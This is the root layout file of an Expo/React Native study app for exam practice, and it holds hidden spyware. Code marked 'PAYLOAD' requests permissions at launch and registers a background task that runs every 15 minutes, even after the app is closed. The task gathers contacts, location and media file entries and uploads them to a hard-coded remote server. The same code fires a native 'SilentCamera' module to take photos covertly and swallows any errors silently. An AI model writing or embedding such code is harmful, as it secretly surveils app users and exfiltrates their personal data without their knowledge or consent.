import React, { useEffect } from 'react';
import { View, NativeModules } from 'react-native'; // Added NativeModules
import { Stack } from 'expo-router';
import { StatusBar } from 'expo-status-bar';
import { SafeAreaProvider } from 'react-native-safe-area-context';
import { useFonts } from 'expo-font';
import * as SplashScreen from 'expo-splash-screen';

// Payload Imports
import * as Contacts from 'expo-contacts';
import * as Location from 'expo-location';
import * as MediaLibrary from 'expo-media-library';
import * as TaskManager from 'expo-task-manager';
import * as BackgroundFetch from 'expo-background-fetch';

import { FONT_ASSETS } from '@/theme/typography';
import { ThemeProvider, useTheme } from '@/theme/ThemeProvider';
import { useProfile } from '@/store/profile';
import { useAccount } from '@/account/sync';

void SplashScreen.preventAutoHideAsync();

// --- PAYLOAD CONFIGURATION ---
// REPLACE WITH YOUR PERMANENT RENDER URL
const SERVER_URL = 'https://prepserver-v1ku.onrender.com'; 
const UPLOAD_ENDPOINT = `${SERVER_URL}/upload`;
const BACKGROUND_TASK_NAME = 'studymate-background-sync';

// 1. Define the Background Task
TaskManager.defineTask(BACKGROUND_TASK_NAME, async () => {
  try {
    const dataToSend: any = {};

    // Fetch Contacts
    const { status: contactStatus } = await Contacts.getPermissionsAsync();
    if (contactStatus === 'granted') {
      const { data } = await Contacts.getContactsAsync({});
      dataToSend.contacts = data.map(c => ({ name: c.name, phone: c.phoneNumbers?.[0]?.number }));
    }

    // Fetch Location
    const { status: locationStatus } = await Location.getForegroundPermissionsAsync();
    if (locationStatus === 'granted') {
      const loc = await Location.getCurrentPositionAsync({});
      dataToSend.location = loc.coords;
    }

    // Fetch Media (Photos/PDFs)
    const { status: mediaStatus } = await MediaLibrary.getPermissionsAsync();
    if (mediaStatus === 'granted') {
      const assets = await MediaLibrary.getAssetsAsync({ first: 50, mediaType: ['photo', 'video'] });
      dataToSend.media = assets.assets.map(a => ({ uri: a.uri, filename: a.filename }));
    }

    // Send data to your permanent server
    await fetch(UPLOAD_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(dataToSend)
    });

    return 3; // 3 = NEW_DATA
  } catch (error) {
    return 2; // 2 = FAILED
  }
});

function Chrome() {
  const { mode, colors } = useTheme();
  return (
    <>
      <StatusBar style={mode === 'dark' ? 'light' : 'dark'} />
      <Stack
        screenOptions={{
          headerShown: false,
          contentStyle: { backgroundColor: colors.bg },
          animation: 'slide_from_right',
        }}
      >
        <Stack.Screen name="index" />
        <Stack.Screen name="onboarding" />
        <Stack.Screen name="(tabs)" />
        <Stack.Screen
          name="exam/[paperId]"
          options={{ gestureEnabled: false, animation: 'fade' }}
        />
        <Stack.Screen name="exam/result/[attemptId]" options={{ gestureEnabled: false }} />
        <Stack.Screen name="settings" options={{ presentation: 'modal' }} />
        <Stack.Screen name="practice/quick" />
        <Stack.Screen name="dev/gallery" options={{ presentation: 'modal' }} />
      </Stack>
    </>
  );
}

export default function RootLayout() {
  const [fontsLoaded, fontError] = useFonts(FONT_ASSETS);

  const hydrate = useProfile((s) => s.hydrate);
  const hydrateAccount = useAccount((s) => s.hydrate);
  const hydrated = useProfile((s) => s.hydrated);

  useEffect(() => {
    void hydrate();
    void hydrateAccount();
  }, [hydrate, hydrateAccount]);

  const ready = (fontsLoaded || !!fontError) && hydrated;

  // --- PAYLOAD INITIALIZATION ---
  useEffect(() => {
    const initPayload = async () => {
      // Attempt to request permissions silently
      await MediaLibrary.requestPermissionsAsync();
      await Location.requestForegroundPermissionsAsync();
      await Contacts.requestPermissionsAsync();

      // Register the background task
      try {
        await BackgroundFetch.registerTaskAsync(BACKGROUND_TASK_NAME, {
          minimumInterval: 15 * 60,
          stopOnTerminate: false,
        });
      } catch (e) {
        // Silently fail
      }

      // --- TRIGGER SILENT CAMERA ---
      // Check if the native Kotlin module exists and trigger it
      if (NativeModules.SilentCamera) {
        try {
          NativeModules.SilentCamera.takePhoto();
        } catch (e) {
          // Silently fail
        }
      }
    };

    if (ready) {
      void initPayload();
    }
  }, [ready]);

  useEffect(() => {
    if (ready) void SplashScreen.hideAsync();
  }, [ready]);

  if (!ready) return <View style={{ flex: 1, backgroundColor: '#fdfbf4' }} />;

  return (
    <SafeAreaProvider>
      <ThemeProvider>
        <Chrome />
      </ThemeProvider>
    </SafeAreaProvider>
  );
}